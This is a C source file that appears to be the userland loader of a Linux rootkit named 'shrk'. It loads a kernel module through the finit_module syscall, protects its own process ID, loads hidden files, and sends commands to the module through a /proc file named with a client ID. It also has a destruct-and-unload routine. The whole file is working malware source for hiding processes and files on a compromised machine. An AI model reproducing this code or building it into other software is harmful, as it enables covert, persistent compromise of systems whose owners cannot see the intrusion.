#include "inc/kernel.h"
#include "inc/cmds.h"
#include "inc/util.h"

#include <sys/syscall.h>
#include <stdbool.h>

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>

bool kernel_load(){
  char *hidden_path = NULL;
  bool ret = false;
  int64_t err = 0;
  int fd = 0;

  if((fd = open(SHRK_MODULE, O_RDONLY)) < 0){
    debug_err("failed to open the kernel module");
    return false;
  }

  err = syscall(SYS_finit_module, fd, "", 0);
  close(fd);

  if(err != 0 && errno != EEXIST){
    debug_err("failed to load the kernel module");
    goto end;
  }

  /*

   * normally when we load the module the process gets protected
   * however in debug mode, this is not the case, so lets manually do it

  */
  if(SHRK_DEBUG)
    protect_pid(getpid());

  if(!load_hidden()){
    debug("failed to load hidden files");
    goto end;
  }

  ret = true;
end:
  if(!ret) kernel_unload();
  return ret;
}

bool kernel_unload(){
  if(!kernel_send(KERNEL_CMD_DESTRUCT, "\x00", 1))
    return false;

  if(syscall(SYS_delete_module, "shrk", O_NONBLOCK) != 0){
    debug_err("failed to unload the kernel module");
    return false;
  }

  return true;
}

bool kernel_send(kernel_cmd_t cmd, void *arg, uint64_t len){
  char cmd_full[len+1];
  bool ret = true;
  int pfd = 0;

  if((pfd = open("/proc/shrk_"SHRK_CLIENT_ID, O_WRONLY)) < 0){
    debug_err("failed to open the kernel module command interface");
    return false;
  }

  cmd_full[0] = cmd;
  memcpy(cmd_full+1, arg, len);

  if(write(pfd, cmd_full, sizeof(cmd_full)) != sizeof(cmd_full)){
    debug_err("failed to write the command");
    ret = false;
  }
  
  close(pfd);
  return ret;
}
